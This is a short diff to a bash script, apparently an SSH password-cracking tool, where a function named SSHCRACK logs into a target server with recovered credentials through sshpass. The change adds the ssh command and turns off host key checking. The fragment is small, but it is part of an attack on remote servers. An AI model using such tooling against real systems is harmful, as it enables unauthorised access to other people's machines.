@@ -133,7 +133,7 @@ function SSHCRACK()
 		echo "[*] Connecting to $vpsip now..."
 		
 		### ACCESS
-		sshpass -p "$vpspass" "$vpsuser"@"$vpsip" 2> /dev/null
+		sshpass -p "$vpspass" ssh -o StrictHostKeyChecking=no "$vpsuser"@"$vpsip" 2> /dev/null
 	
 	### UNSUCCESSFUL ATTACK
 	else
